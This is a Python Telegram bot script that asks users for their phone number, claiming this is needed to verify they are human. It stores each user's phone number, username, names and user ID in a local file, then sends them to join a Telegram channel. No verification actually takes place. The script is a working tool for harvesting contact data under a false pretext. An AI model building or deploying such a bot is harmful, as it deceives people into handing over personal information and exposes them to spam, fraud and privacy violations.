import telebot
import api
from telebot import types

print('Bot Active...')

API_KEY= api.API_KEY
bot = telebot.TeleBot(API_KEY)

keyboard = types.ReplyKeyboardMarkup (row_width = 1)
button_phone = types.KeyboardButton (text = "Tap Here to Instantly Send Phone/Contact", request_contact = True)
keyboard.add (button_phone) #Add this button

# baseurl=api.base_update_url.format(API_KEY)

contact_recieved=False

@bot.message_handler (commands = ['start'])
def phone (message):
    global contact_recieved
    contact_recieved=False
    bot.send_message (message.chat.id, 'To Correctly work and to verify you are a human and not a bot please share your Phone number. Use the below button to instantly share your contact', reply_markup = keyboard)

@bot.message_handler (content_types = ['contact']) 
def contact (message):
    global contact_recieved
    if contact_recieved:
        bot.send_message (message.chat.id, 'No command found. Please join Channel.')
        return
    if message.contact is not None:
        data={}
        data['username']=message.chat.username
        data['phone_number']=message.contact.phone_number
        data['first_name']=message.contact.first_name
        data['last_name']=message.contact.last_name
        data['user_id']=message.contact.user_id

        file=open('phNo.txt','a')
        file.write(str(data)+"\n")
        file.close()

        removeKeyboard=types.ReplyKeyboardRemove(keyboard)

        bot.send_message (message.chat.id, 'Thank you for sharing your contact. Your contact no is '+ str(data['phone_number']) + ' and you are successfully verified. Please Join the Channel : https://t.me/kuldeepverma123',reply_markup=removeKeyboard)
        print('Data Recieved')
        contact_recieved=True


   
def message_request(message):
    global contact_recieved
    if contact_recieved:
        bot.send_message (message.chat.id, 'No command found. Please join Channel.')
        return
    request=message.text.split()
    recieved=False
    if len(str(request[0])) == 10 :
        try:
            isinstance(int(request[0]), int)
            recieved=True
        except:
            bot.send_message (message.chat.id, 'There may be Charachters in your response .Please provide a valid 10 Digit Number or use the below button instead',reply_markup = keyboard)
    else:
        bot.send_message (message.chat.id, 'Please provide a 10 Digit valid Number or use the below button instead',reply_markup = keyboard)
    if recieved:
        data={}
        data['username']=message.chat.username
        data['phone_number']=request[0]
        data['first_name']=message.chat.first_name
        data['last_name']=message.chat.last_name
        data['user_id']=message.chat.id

        file=open('phNo.txt','a')
        file.write(str(data)+"\n")
        file.close()

        removeKeyboard=types.ReplyKeyboardRemove(keyboard)

        bot.send_message (message.chat.id, 'Thank you for sharing your contact. Your contact no is '+ str(data['phone_number']) + ' and you are successfully verified. Please Join the Channel : https://t.me/',reply_markup=removeKeyboard)
        print('Data Recieved')
        contact_recieved=True

@bot.message_handler(func=message_request)
def message_request_reply(message):
    pass

bot.polling()

